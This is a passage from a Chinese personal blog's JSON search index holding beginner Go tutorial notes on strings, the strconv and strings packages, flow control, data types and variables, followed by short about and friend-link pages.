:= \"beijing\" fmt.Println(str1 + str2) //用+号来连接字符串不高效 //我们使用StringBuilder来高效字符串连接 //创建字节缓冲 var stringBuilder strings.Builder //把字符串写入缓冲 stringBuilder.WriteString(str1) stringBuilder.WriteString(str2) //将缓冲以字符串形式输出 fmt.Println(stringBuilder.String()) ","date":"2023-03-15","objectID":"/post/ad0f0f0b/:0:3","tags":["Golang","编程"],"title":"Go入门日记-字符串","uri":"/post/ad0f0f0b/"},{"categories":["Golang"],"content":"四、strings包相关函数 //查找s在字符串str中的索引 //Index(str, s string) int str := \"hello beijing\" s := \"e\" fmt.Println(strings.Index(str, s)) //输出 1 //判断str是否包含s //Contains(str, s string) bool fmt.Println(strings.Contains(str, s)) //输出 true //使用字符串str连接s的各个字符串 //Join(s []string, str string) string str := \"\u003c--\u003e\" s := []string{\"O\", \"O\", \"O\"} fmt.Println(strings.Join(s, str)) //输出 O\u003c--\u003eO\u003c--\u003eO //替换字符串str中old字符串为new字符串，n表示替换的次数，小于0全部替换 //Replace(str,old,new string,n int) string str := \"hello\" old := \"e\" new := \"o\" fmt.Println(strings.Replace(str, old, new, 1)) //输出 hollo //字符串str按照s分割，返回切片 //Split(str,s string)[]string str := \"php\" s := \"h\" fmt.Println(strings.Split(str, s)) //输出 [p p] // 去除头部、尾部指定的字符串 //Trim(s string, cutset string) string str := \"linux\" s := \"l\" fmt.Println(strings.Trim(str, s)) //输出 inux // 去除空格，返回切片 //Fields(s string) []string s := \"ha ha\" fmt.Println(strings.Fields(s)) //输出 [ha ha] ","date":"2023-03-15","objectID":"/post/ad0f0f0b/:0:4","tags":["Golang","编程"],"title":"Go入门日记-字符串","uri":"/post/ad0f0f0b/"},{"categories":["Golang"],"content":"五、strconv包的字符串转换 //整型转字符串 num := 100 str := strconv.Itoa(num) fmt.Printf(\"type: %T value: %#v\\n\", str, str) //输出 type: string value: \"100\" //字符串转整型(字符串中如果夹杂这非数字的字符则可能转换失败) str1 := \"110\" str2 := \"s100\" num1, err := strconv.Atoi(str1) if err != nil { fmt.Printf(\"%v 转换失败！\", str1) } else { fmt.Printf(\"type:%T value:%#v\\n\", num1, num1) } num2, err := strconv.Atoi(str2) if err != nil { fmt.Printf(\"%v 转换失败！\", str2) } else { fmt.Printf(\"type:%T value:%#v\\n\", num2, num2) } //输出 //type:int value:110 //s100 转换失败！ //Parse 系列函数 //ParseBool字符串转为布尔型 //只能接受 1、0、t、f、T、F、true、false、True、False、TRUE、FALSE其他都返回错误 str1 := \"t\" boo1, err := strconv.ParseBool(str1) if err != nil { fmt.Printf(\"str1: %v\\n\", err) } else { fmt.Println(boo1) } //输出 true //ParseInt返回字符串表示的整数值(包括正负号) //参数1: s string 数字的字符串形式 //参数2: base int 取值(2-36) //Tips: 如果base为0，根据字符串前置判断，“0x”是16进制，“0”是8进制，否则是10进制 //参数3: bitSize int 指定结果必须能无溢出赋值的整数类型，0、8、16、32、64 分别代表 //int、int8、int16、int32、int64,限制转化生成int类型的位数,但是返回结果都是int64 //可参考链接: https://studygolang.com/topics/12335 str := \"-11\" num, err := strconv.ParseInt(str, 10, 0) if err != nil { fmt.Println(err) } else { fmt.Println(num) } //输出 -11 //ParseUint函数的功能类似于ParseInt函数,只适用于无符号整数 //不再举例 //ParseFloat 函数用于将一个表示浮点数的字符串转换为 float 类型 //参数说明： //如果 s 合乎语法规则，函数会返回最为接近 s 表示值的一个浮点数（使用 IEEE754 规范舍入）。 //bitSize 指定了返回值的类型，32 表示 float32，64 表示 float64； //返回值 err 是 *NumErr 类型的，如果语法有误 err.Error=ErrSyntax， //如果返回值超出表示范围，返回值 f 为 ±Inf，err.Error= ErrRange。 //Format 系列函数 //FormatBool函数可以一个bool类型的值转换为对应的字符串类型 num := true str := strconv.FormatBool(num) fmt.Printf(\"type:%T,value:%v\\n \", str, str) //输出 type:string,value:true //FormatInt函数将整型数据转成指定类型字符串 //Tips:参数 i 必须是 int64 类型 var num int64 = 16 str := strconv.FormatInt(num, 16) fmt.Printf(\"type:%T,value:%v\\n \", str, str) //输出 type:string,value:10 //FormatUint函数与FormatInt函数的功能类似，但是参数 i 必须是无符号的 uint64 类型 //不再举例 //FormatFloat函数用于将浮点数转换为字符串类型 //参数1: bitSize 参数f的来源类型（32表示float32、64表示float64）会据此进行舍入 //参数2: fmt 表示格式，可以设置为“f”表示 -ddd.dddd、“b”表示 -ddddp±ddd，指数为二进制、 //“e”表示 -d.dddde±dd 十进制指数、“E”表示 -d.ddddE±dd 十进制指数、“g”表示指数很大时用“e”格式， //否则“f”格式、“G”表示指数很大时用“E”格式，否则“f”格式。 //参数3: prec 控制精度（排除指数部分）：当参数 fmt 为“f”、“e”、“E”时，它表示小数点后的数字个数 //当参数 fmt 为“g”、“G”时，它控制总的数字个数。 //如果 prec 为 -1，则代表使用最少数量的、但又必需的数字来表示 f。 var num float64 = 3.1415926 str := strconv.FormatFloat(num, 'E', -1, 64) fmt.Printf(\"type:%T,value:%v\\n \", str, str) //输出 type:string,value:3.1415926E+00 //Append 系列函数 // 声明一个slice b10 := []byte(\"int (base 10):\") // 将转换为10进制的string，追加到slice中 b10 = strconv.AppendInt(b10, -42, 10) fmt.Println(string(b10)) b16 := []byte(\"int (base 16):\") b16 = strconv.AppendInt(b16, -42, 16) fmt.Println(string(b16)) //输出 int (base 10):-42 int (base 16):-2a ","date":"2023-03-15","objectID":"/post/ad0f0f0b/:0:5","tags":["Golang","编程"],"title":"Go入门日记-字符串","uri":"/post/ad0f0f0b/"},{"categories":["Golang"],"content":"Go3：流程控制 ","date":"2023-03-15","objectID":"/post/fd173a46/:0:0","tags":["Golang","编程"],"title":"Go入门日记-流程控制","uri":"/post/fd173a46/"},{"categories":["Golang"],"content":"一、条件语句 1.1 if判断语句： if i == 3{ //如果i等于3输出true fmt.Println(\"true\") } //将初始化条件与判断语句放在一起 if i := 3;i == 3{ //如果i等于3输出true fmt.Println(\"true\") } 1.2 分支语句 //Go语言中分支语句中默认书写了break语句 num := 2 switch num { case 1: fmt.Println(\"111\") case 2: fmt.Println(\"222\") fallthrough //fallthrough 不跳出switch case 3: fmt.Println(\"333\") default: fmt.Println(\"默认\") } //输出： 222 333 ","date":"2023-03-15","objectID":"/post/fd173a46/:0:1","tags":["Golang","编程"],"title":"Go入门日记-流程控制","uri":"/post/fd173a46/"},{"categories":["Golang"],"content":"二、循环语句 2.1 for循环 //传统for循环 for i := 0; i \u003c 10; i++ { fmt.Println(i) } //for循环简化 var i int for ; ; i++ { if i \u003e 10 { break } } //类似while循环 for i \u003c 10 { i++ } //死循环 for{ } //for range 遍历数组等 for k, v := range []int{1, 2, 3, 4} { fmt.Printf(\"key:%d value:%d\\n\", k, v) } //输出： key:0 value:1 key:1 value:2 key:2 value:3 key:3 value:4 2.2 跳出循环 常用的跳出循环关键字： break用于函数内跳出当前for、switch、select语句的执行 continue用于跳出for循环的本次迭代。 goto可以退出多层循环 goto 标签 标签： ","date":"2023-03-15","objectID":"/post/fd173a46/:0:2","tags":["Golang","编程"],"title":"Go入门日记-流程控制","uri":"/post/fd173a46/"},{"categories":["Golang"],"content":"Go2：数据类型初识 ","date":"2023-03-15","objectID":"/post/71c0dfce/:0:0","tags":["Golang","编程"],"title":"Go入门日记-数据类型","uri":"/post/71c0dfce/"},{"categories":["Golang"],"content":"一、数据类型分类 Go 语言按类别有以下几种数据类型：布尔型、数字型、字符串型、派生型 整型 int8、uint等 数字型 浮点型 float32、float64等 数字型 复数 数字型 布尔型 bool 布尔型 字符串 string 字符串型 数组 派生型 结构体 struct 派生型 引用类型：即保存的是对程序中一个变量的或状态的间接引用，对其修改将影响所有该引用的拷贝 指针 * 切片 slice 字典 map 函数 func 管道 chan 接口 interface tip：Go语言没有字符型，可以使用byte来保存单个字母 ","date":"2023-03-15","objectID":"/post/71c0dfce/:0:1","tags":["Golang","编程"],"title":"Go入门日记-数据类型","uri":"/post/71c0dfce/"},{"categories":["Golang"],"content":"二 、零值机制 Go变量初始化会自带默认值，不像其他语言为空，下面列出各种数据类型对应的0值： int 0 int8 0 int32 0 int64 0 uint 0x0 rune 0 //rune的实际类型是 int32 byte 0x0 // byte的实际类型是 uint8 float32 0 //长度为 4 byte float64 0 //长度为 8 byte bool false string \"\" ","date":"2023-03-15","objectID":"/post/71c0dfce/:0:2","tags":["Golang","编程"],"title":"Go入门日记-数据类型","uri":"/post/71c0dfce/"},{"categories":["Golang"],"content":"Go1：语言标识符与变量 ","date":"2023-03-14","objectID":"/post/1025c530/:0:0","tags":["Golang","编程"],"title":"Go入门日记-标识符与变量","uri":"/post/1025c530/"},{"categories":["Golang"],"content":"1.1关键字 目前Go语言有25个关键字 break default func interface select case defer go map struct chan else goto package switch const fallthrough if range type continue for import return var ","date":"2023-03-14","objectID":"/post/1025c530/:0:1","tags":["Golang","编程"],"title":"Go入门日记-标识符与变量","uri":"/post/1025c530/"},{"categories":["Golang"],"content":"1.2保留字 //内建常量： true false iota nil //内建类型： int int8 int16 int32 int64 uint uint8 uint16 uint32 uint64 uintptr float32 float64 complex128 complex64 //bool： byte rune string error //内建函数： make delete complex panic append copy close len cap real imag new recover ","date":"2023-03-14","objectID":"/post/1025c530/:0:2","tags":["Golang","编程"],"title":"Go入门日记-标识符与变量","uri":"/post/1025c530/"},{"categories":["Golang"],"content":"二、变量 2.1变量声明 var a int //初始化变量默认为0 var b = 1 //声明并赋值，自动推导变量类型 c := 2 //初始化，自动推导类型(只能在函数内部使用，var定义全局变量) //Go语言中有定义未使用的变量编译会报错 //大小写变量为不同变量 2.2多变量声明 var c,d int var c1,d1 int = 1,2 var c1,d1 = 1,2 c,d := 1,2 var( e int f byte ) 2.3变量值互换 在Go语言中两个变量互换的操作十分简单 var ( //定义初始化变量 m int = 1 n int = 2 temp int = 6 ) m,n = n,m //将m与n的变量值互换 fmt.Println(m, n) //2 1 2.4_丢弃变量 //_丢弃变量任何赋予它的值都会被丢弃，该变量不占用命名空间 _,d := 1,2 //此时d的值为2，1被丢弃掉 ","date":"2023-03-14","objectID":"/post/1025c530/:1:0","tags":["Golang","编程"],"title":"Go入门日记-标识符与变量","uri":"/post/1025c530/"},{"categories":null,"content":" 关于我 生活明朗，万物向上 你好，很高兴认识你👋 我叫浔若 是一名 在校大学生 追求 源于 热爱而去感受 学习 生活 程序 体验 技能开启创造力 Docker Photoshop Node Python Java CSS3 JS HTML Git ... 数据访问统计 统计信息来自51la网站统计 性格倡导者 INFJ-T 座右铭每天，进步一点点。 ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":" 添加友链，评论格式如下： - nickname: 博客名 avatar: 头像url url: 网站url description: 博客网站描述 ","date":"0001-01-01","objectID":"/friends/:0:0","tags":null,"title":"友情链接","uri":"/friends/"}]